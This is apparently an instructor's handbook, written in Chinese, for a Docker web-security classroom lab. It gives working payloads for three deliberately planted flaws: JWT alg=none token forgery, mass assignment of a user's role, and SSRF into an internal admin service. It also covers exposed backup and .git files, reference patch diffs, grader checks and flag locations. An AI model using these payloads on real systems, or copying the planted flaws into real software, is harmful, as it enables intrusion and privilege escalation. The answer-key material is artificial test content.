# Lab B3 · 講師手冊

## 一分鐘檢查

```bash
cd labs/lab-b3
docker compose up -d --build
docker compose ps                                  # memo / admin / patchboard 三個 Up
curl -s localhost:8101/health                      # ok
curl -s localhost:8101/_version                    # loaded == file（載入了哪一版 handlers.py）
curl -s localhost:8103/api/state | python3 -m json.tool | head -20   # 計數/checks（刻意不含 flags）
curl -s -o /dev/null -w '%{http_code}\n' localhost:8101/app.py.bak    # 200 = A05 的素材還在（正常）
```

要看這一輪的 flag（講師查核用；補丁台的 API 不吐答案）：

```bash
docker compose exec -T memo cat /srv/flag1.txt /srv/flag2.txt
docker compose exec -T admin cat /srv/flag3.txt
```

## 架構（為什麼長這樣）

| 檔案 | 角色 |
|---|---|
| `memo/server.py` | Flask 外殼：建 DB 與種子資料、載入 `/app/handlers.py`、**mtime 變了就重載**（照 lab-b2 的做法）、`/_version` 探針 |
| `memo/seed/handlers.py` | **三個洞都在這支**：JWT 驗證、`PATCH /api/profile`、`/fetch`；補丁台上傳替換的就是它 |
| `admin/app.py` | 內部系統：`/ping` 回 pong、`/flag` 回 `/srv/flag3.txt`；compose 裡沒有 `ports` |
| `patchboard/app.py` | 三洞計數、每 120 秒換 flag＋換 admin 密碼、checks、補丁上傳 |
| `instructor/patches/*.py` | 三個累積式參考補丁（02 含 01、03 含 01+02） |

Volume：`memo_code`（memo 的 `/app`，可被補丁覆寫）、`memo_data`（`/srv`：DB＋flag1／flag2）、`admin_data`（`/srv`：flag3）。全部 named volume，沒有 bind mount。

## 三個洞與標準 payload

### 洞 1 · JWT alg=none（flag1）

```bash
curl -s -i -d 'username=demo&password=demo' http://localhost:8101/login | grep -i x-token
```

```python
import base64, json
b = lambda o: base64.urlsafe_b64encode(json.dumps(o).encode()).decode().rstrip("=")
print(b({"alg": "none", "typ": "JWT"}) + "." + b({"sub": "demo", "role": "admin"}) + ".")
```

```bash
curl -H "Authorization: Bearer <那串>" http://localhost:8101/admin/panel    # 身分區 → flag1
```

`claims_of()` 看到 header 的 `alg=none` 就直接回傳 payload、跳過簽章比對。

### 洞 2 · Mass assignment（flag2）

```bash
curl -s -c /tmp/ck -d 'username=demo&password=demo' http://localhost:8101/login
curl -b /tmp/ck -X PATCH -H 'Content-Type: application/json' \
     -d '{"role":"admin","bio":"pwned"}' http://localhost:8101/api/profile
curl -b /tmp/ck http://localhost:8101/admin/panel                          # 帳號區 → flag2
```

`PATCH /api/profile` 用 `", ".join(f"{k}=?" for k in data)` 把 body 的 key 全部塞進 UPDATE。

### 洞 3 · SSRF（flag3）

```bash
curl 'http://localhost:8101/fetch?url=http://admin:8000/ping'   # pong（功能）
curl 'http://localhost:8101/fetch?url=http://admin:8000/flag'   # → flag3
```

`/fetch` 對任何 url 都 `requests.get`；admin 只在 compose 網路裡，memo 打得到。

### 練習 4 · A05 設定錯誤：忘了刪的檔案（沒有 flag）

```bash
curl -s http://localhost:8101/app.py.bak | head -20    # 200，整份 handlers.py（含 SECRET = "dev"、三個洞的註解）
curl -s http://localhost:8101/.git/config              # 200，remote url、branch 設定
```

這兩個是「部署時忘了刪」的典型：備份檔與 `.git` 跟著程式碼一起上線，而且服務還把它們當路由回出去。
`app.py.bak` 直接洩漏 `SECRET = "dev"` 與 JWT/hole 的完整邏輯 —— 跟洞 1 是同一條線索（知道密鑰的人也就能自己簽票）。

修好之後兩條都回 404：

```bash
curl -s -o /dev/null -w '%{http_code}\n' http://localhost:8101/app.py.bak
curl -s -o /dev/null -w '%{http_code}\n' http://localhost:8101/.git/config
```

## 修法 diff

### 01 · JWT

```diff
-    # 洞 1：header 說 alg=none，就直接相信 payload，不驗簽章
-    if head.get("alg") == "none":
-        return body
+    # 修法 1：演算法固定 HS256；alg=none 一律拒絕，簽章一定要驗
+    if head.get("alg") != "HS256":
+        return None
```

### 02 · Mass assignment

```diff
         if req.method == "PATCH":
-            # 洞 2：body 的 key 全部當成欄位寫進 users —— 包括 role
             data = req.get_json(silent=True)
             if not isinstance(data, dict) or not data:
                 return {"error": "send a JSON object"}, 400
+            data = {k: v for k, v in data.items() if k in ("bio", "email")}
+            if not data:
+                return {"error": "只有 bio、email 可以改"}, 400
             sets = ", ".join(f"{k}=?" for k in data)
```

### 03 · SSRF

```diff
 ADMIN_URL = os.environ.get("ADMIN_URL", "http://admin:8000")
+ALLOW = {"http://admin:8000/ping"}   # 修法 3：只放行功能真的需要的那一條
```

```diff
     if path == "fetch":
-        # 洞 3：url 原樣送出去，沒有白名單
         url = req.args.get("url", "").strip()
         if not url:
             return "missing url", 400
+        if url not in ALLOW:
+            return "blocked: 不在白名單", 403
```

### 04 · A05 忘了刪的檔案

```diff
-    if path == "app.py.bak":
-        # A05：備份檔忘了刪 —— 裡面有 SECRET 和所有洞的邏輯
-        try:
-            with open(BAK) as f:
-                return f.read(), 200, {"Content-Type": "text/plain; charset=utf-8"}
-        except OSError:
-            return "not found", 404
-
-    if path == ".git/config":
-        # A05：.git 沒刪，遠端網址與分支設定直接露出來
-        return GIT_CONFIG, 200, {"Content-Type": "text/plain; charset=utf-8"}
+    if path in ("app.py.bak", ".git/config"):
+        # 修法 4：備份檔與 .git 都不該由服務提供。
+        # 真的修法是把它們從部署目錄刪掉；這裡在程式層先擋成 404。
+        return "not found", 404
```

> 正式環境的修法是「刪檔案 + 別讓服務 serve 靜態目錄」，程式層的 404 只是止血。課堂上值得多講一句：這類東西通常在 CI 的 artifact 或 Docker build context 裡就該被 `.dockerignore` 擋掉。

## checks 的定義（patchboard/app.py，全部由外部 HTTP 判斷）

| 洞 | 功能類 | 攻擊類 |
|---|---|---|
| jwt | `GET /health` ok、`POST /login` demo/demo 302、`GET /memo/1` 200、**demo 自己看 `/admin/panel` 200** | 用 `alg=none` 簽的 token 讀 `/admin/panel` 不得出現 flag1 |
| massassign | 同上 ＋ **`PATCH {"bio":…}` 回 200 且 role 不變** | `PATCH /api/profile {"role":"admin"}` 之後，`/admin/panel` 不得出現 flag2（＝role 沒被改動） |
| ssrf | 同上 ＋ `GET /fetch?url=http://admin:8000/ping` 回 pong | `GET /fetch?url=http://admin:8000/flag` 不得出現 flag3 |
| misconfig | 同上 | `GET /app.py.bak` 與 `GET /.git/config` 都要回 **404**（只認 404，回 403 不算） |

只有「你選的那個洞」全部 pass，才 `repair[洞] +1`；另外兩個洞的狀態照樣列出來，方便學生看到「我修 A 把 B 弄回去了」。

換輪（`ROUND_SECONDS`，預設 120）時：三條 flag 全換、`demo` 的 role 復位成 `user`、admin 密碼換掉、`claimed` 清空；`attack`／`repair` 累積不清。

`/admin/panel` 的設計：**身分區只看 token 的 `role`、帳號區只看 DB 裡「token 的 `sub` 那一列」的 `role`**。
兩個洞各打一邊，互不遮蔽：

- 偽造 token → 身分區開。`sub=demo` 或 `sub=admin` 都一樣：**帳號區查的是被冒充的那一列**，
  而 `admin` 種子列的 `role` 是 `user`（它只是平台代管帳號），所以偽造任何 token 都只拿得到 flag1。
- mass assignment 改 DB → 帳號區開；token 沒有重發，身分區仍是 `user`。

> 這一條是修過的：先前 `admin` 種子列的 `role` 是 `admin`，偽造 `sub=admin` 會順便把帳號區也打開、
> 一次拿兩條 flag。種子改成 `user` 之後，`check_jwt` 也才真的只驗 flag1。

## 時間分配（60 分鐘）

| 分鐘 | 內容 |
|---|---|
| 0–10 | 起 Lab、講補丁台與雙計數、示範 JWT 那條一次（打＋修） |
| 10–25 | 任務 1（JWT alg=none）：偽造 token、上傳 01、看 checks |
| 25–40 | 任務 2（mass assignment）：PATCH role、上傳 02 |
| 40–52 | 任務 3（SSRF）：打內網、上傳 03 |
| 52–58 | 練習 4（A05）：看 `.bak`／`.git`、上傳 04（只算修補） |
| 58–60 | 結算：三個洞的攻破＋四個修補（最多 7 分） |

## 我做的幾個取捨（你可以改）

1. **admin 帳號的密碼每輪隨機，而且它的 `role` 是 `user`**。它只是「平台代管帳號」的擺設：
   學生永遠登不進去（不然 flag1／flag2 直接免費），也不能靠偽造 `sub=admin` 順手打開帳號區。
2. **`/admin/panel` 拆成兩個區塊**（token 說的話 vs DB 說的話）。你原本的描述是兩個洞都打 `/admin/panel`；如果只有一頁一種判斷，先破的那個洞會把兩條 flag 一起送出去。拆開之後兩條路各自成立、互不遮蔽，checks 也才測得準。
   （jwt 組另外加了一項「demo 自己看 `/admin/panel` 要 200」、massassign 組加了「PATCH bio 成功且 role 不變」，
   免得學生用「把端點刪掉」的方式假裝修好。）
3. **flag1／flag2 放在 memo 的 `/srv` 檔、flag3 在 admin 的 `/srv`**。不放 DB：DB 是學生能看（PATCH 會回傳整列）也常被改動的地方，容易不小心漏答案。換輪時補丁台直接寫檔。
4. **JWT 自己手寫（base64 + hmac），沒有用 PyJWT**。PyJWT 預設就拒絕 `alg=none`，要做出這個洞得先繞過它；手寫反而讓學生一眼看到「為什麼 alg=none 這麼危險」，修法也只是三行。
5. **三個洞各自計分、各自 checks**，補丁可累積（02 含 01、03 含 01+02）。這樣「一次補一個洞」拿得到三點，也不會補了後面把前面弄回去。
6. **`/_version`** 是「補丁有沒有生效」的探針；補丁台上傳後會輪詢它，確認重載了才跑 checks——macOS 的 volume 有時 mtime 只到秒、stat 還會快取，不加這一步會出現「剛傳完 checks 還是舊行為」。
7. **SSRF 的白名單是「整條 URL」而不是「主機」**：你要的檢查是「ping 要通、flag 要被擋」，只做 host 白名單會讓 `admin:8000/flag` 也放行。所以參考補丁做成 `ALLOW = {"http://admin:8000/ping"}`，課堂上可以順便討論「主機白名單 vs 路徑白名單」的差別。
8. `demo` 的 role 每輪由補丁台復位成 `user`——不然有人 mass assignment 完沒還原，後面幾輪的 checks 會一直被影響。
9. **A05 獨立成第四個 challenge，但沒有 flag。** 它沒有「攻破」可拿——攻破要交 flag，而你不需要 flag 就能看到 `.bak`。補丁台對它的顯示是「攻破 —、修補 +1」，下拉選單裡也不會出現在「提交 flag」那一欄。放進 ssrf 那組雖然省一個洞，但會讓「修好 SSRF 卻沒刪備份檔」的學生拿不到 SSRF 的修補分，兩件事不該綁在一起。
10. `app.py.bak` 是**真的檔案**（Dockerfile 把種子 `handlers.py` 複製成 `/app/app.py.bak`），不是路由裡硬寫的字串——這樣「修法」才有兩種層次：刪檔（正式）與路由擋掉（止血）。

## 卡住時

| 症狀 | 原因 |
|---|---|
| apply 後 checks 全紅、訊息有「載入失敗」 | 上傳的 handlers.py 有語法錯誤（訊息裡有摘要） |
| JWT 那關怎麼改都 fail | `alg` 比對寫成「不等於 none 就放行」——要反過來固定 `HS256` |
| mass assignment 那關怎麼改都 fail | 你只擋了 role 這個 key，沒有做白名單（`{"role":"admin","role ":1}` 之類） |
| SSRF 那關功能 fail | 白名單太窄，把 `ping` 也擋了 |
| 某一項一直 fail | 先 `curl localhost:8101/_version` 確認 loaded 有沒有變 |
| demo 登入不了 | 有人改過 demo 的密碼（本 Lab 沒有改密碼功能，多半是 PATCH 亂寫），`down -v` 重來 |
| 想改輪長 | `docker-compose.yml` 的 `ROUND_SECONDS`（預設 120） |
| build 卡在 buildx 權限（這個環境） | `DOCKER_BUILDKIT=0 docker build -t lab-b3-<svc> ./<svc>` 後 `docker compose up -d` |
